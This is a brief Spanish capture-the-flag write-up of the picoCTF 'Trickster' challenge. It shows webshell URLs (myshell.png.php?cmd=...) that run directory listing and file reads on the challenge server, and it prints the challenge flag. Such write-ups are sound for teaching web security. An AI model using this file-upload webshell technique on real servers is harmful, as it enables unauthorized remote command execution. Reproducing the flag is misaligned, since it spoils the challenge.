### Trickster
### Descripcion
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:53957/)!
### Solucion
http://atlas.picoctf.net:53957/uploads/myshell.png.php?cmd=ls%20..
- Con esto se ve el archivo en el cual se encuentra la bandera
- MFRDAZLDMUYDG.txt tiene un PNG al principio este se borra
http://atlas.picoctf.net:53957/uploads/myshell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt
- Con este link se abre la bandera.
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
### Notas
Una **Webshell** es un script o programa malicioso que un atacante sube a un servidor web para obtener **acceso remoto y control total** sobre el sistema a través de una interfaz web (usualmente un navegador).
### Referencias
